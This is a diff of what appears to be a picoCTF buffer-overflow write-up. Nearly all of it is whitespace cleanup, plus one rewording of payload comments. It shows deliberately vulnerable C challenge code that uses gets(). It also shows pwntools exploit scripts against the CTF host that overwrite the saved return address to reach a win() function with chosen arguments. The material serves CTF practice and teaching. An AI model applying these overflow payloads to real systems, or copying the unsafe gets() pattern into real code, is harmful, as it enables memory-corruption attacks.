@@ -52,17 +52,17 @@ void vuln(char *input){
 }
 
 int main(int argc, char **argv){
-  
+
   FILE *f = fopen("flag.txt","r");
   if (f == NULL) {
     printf("%s %s", "Please create 'flag.txt' in this directory with your",
                     "own debugging flag.\n");
     exit(0);
   }
-  
+
   fgets(flag,FLAGSIZE_MAX,f);
   signal(SIGSEGV, sigsegv_handler); // Set up signal handler
-  
+
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
 
@@ -70,7 +70,7 @@ int main(int argc, char **argv){
   printf("Input: ");
   fflush(stdout);
   char buf1[100];
-  gets(buf1); 
+  gets(buf1);
   vuln(buf1);
   printf("The program will exit now\n");
   return 0;
@@ -155,7 +155,7 @@ void vuln(){
 int main(int argc, char **argv){
 
   setvbuf(stdout, NULL, _IONBF, 0);
-  
+
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
 
@@ -374,7 +374,7 @@ The offset from input to saved EIP is 44 and this is enough for us to write the 
 
 from pwn import *
 
-# context.log_level = 'debug' 
+# context.log_level = 'debug'
 exe = context.binary = ELF('./vuln', checksec=False)
 
 
@@ -402,12 +402,12 @@ c
 ''')
 
 p = remote('saturn.picoctf.net', 59056) if args.REMOTE else process(argv=[exe.path], aslr=False)
-if args.GDB: 
+if args.GDB:
     GDB()
     input()
 
 # ===========================================================
-#                          EXPLOIT 
+#                          EXPLOIT
 # ===========================================================
 
 payload = b'A'*44
@@ -461,7 +461,7 @@ When we enter a large enough buffer to reach EIP and after returning, it will ju
 
 from pwn import *
 
-# context.log_level = 'debug' 
+# context.log_level = 'debug'
 exe = context.binary = ELF('./vuln', checksec=False)
 
 
@@ -490,17 +490,17 @@ c
 ''')
 
 p = remote('saturn.picoctf.net', 51113) if args.REMOTE else process(argv=[exe.path], aslr=False)
-if args.GDB: 
+if args.GDB:
     GDB()
     input()
 
 # ===========================================================
-#                          EXPLOIT 
+#                          EXPLOIT
 # ===========================================================
 
 payload = b'A'*112 # buf
-payload += p32(exe.sym['win']) # EIP = win addr
-payload += b'A'*4 # Junk for saved RBP
+payload += p32(exe.sym['win']) # Overwrite EIP with win function address
+payload += b'A'*4 # Junk for return address (You can set for it return back to main after the win function done)
 payload += p32(0xCAFEF00D) # arg1
 payload += p32(0xF00DF00D) # arg2
 
